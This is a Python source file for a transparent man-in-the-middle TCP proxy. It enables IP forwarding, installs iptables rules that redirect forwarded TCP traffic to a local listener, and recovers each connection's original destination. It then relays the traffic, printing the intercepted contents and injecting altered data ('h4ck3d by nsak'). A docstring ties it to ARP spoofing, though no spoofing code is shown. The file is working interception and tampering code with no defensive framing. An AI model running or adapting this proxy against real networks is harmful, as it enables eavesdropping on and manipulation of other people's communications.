import socket
import struct
import subprocess
import threading

SO_ORIGINAL_DST = 80  # from linux/netfilter_ipv4.h


def set_ip_forwarding(value: bool) -> None:
    """
    Set ip forwarding on the system.

    :param value:
    :return:
    """
    str_value = "1" if value else "0"
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write(str_value)


def configure_iptables(iface: str, ip: str, port: int) -> None:
    """
    Setup iptables rules for forwarding packets to netfilter queue.

    :return:
    """
    subprocess.run([
        "iptables",
        "-A", "FORWARD",
        "-i", iface,
        "-o", iface,
        "-j", "ACCEPT"
    ], check=True)
    subprocess.run([
        "iptables", "-t", "nat",
        "-A", "PREROUTING",
        "-i", iface,
        "-p", "tcp",
        "!", "-s", ip,
        "-j", "REDIRECT",
        "--to-ports", str(port)
    ], check=True)
    subprocess.run([
        "iptables",
        "-A", "INPUT",
        "-p", "tcp",
        "--dport", str(port),
        "-j", "ACCEPT"
    ], check=True)


def get_original_address(sock: socket.socket) -> tuple[str, int]:
    """


    :param sock:
    :return:
    """
    data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    _, port, raw_ip = struct.unpack("!HH4s8x", data)
    ip = socket.inet_ntoa(raw_ip)
    return ip, port


def forward_tcp_connection(source: socket.socket, destination: socket.socket) -> None:
    """


    :param source:
    :param destination:
    :return:
    """
    print(f"[+] Forwarding connection from {source.getpeername()} to {destination.getpeername()}")

    while True:
        data = source.recv(4096)
        if not data:
            break

        print(data.decode(), flush=True)
        data = data.replace(b"hello", b"h4ck3d by nsak")
        destination.sendall(data)

    source.close()
    destination.close()


def terminate_tcp_connection(client: socket.socket) -> None:
    """

    :return:
    """
    address = get_original_address(client)
    print(f"[+] Terminating connection to {address}")
    server = socket.create_connection(address)

    threading.Thread(target=forward_tcp_connection, args=(client, server)).start()
    threading.Thread(target=forward_tcp_connection, args=(server, client)).start()


def start_tcp_proxy(ip: str, port: int) -> None:
    """


    :return:
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((ip, port))
    sock.listen()

    print("[+] MITM TCP proxy listening")

    while True:
        client, _ = sock.accept()
        terminate_tcp_connection(client)


def run(iface: str, ip: str, port: int) -> None:
    """
    Start arp spoofing on the provided interface.
    """

    set_ip_forwarding(True)
    configure_iptables(iface, ip, port)
    start_tcp_proxy(ip, port)
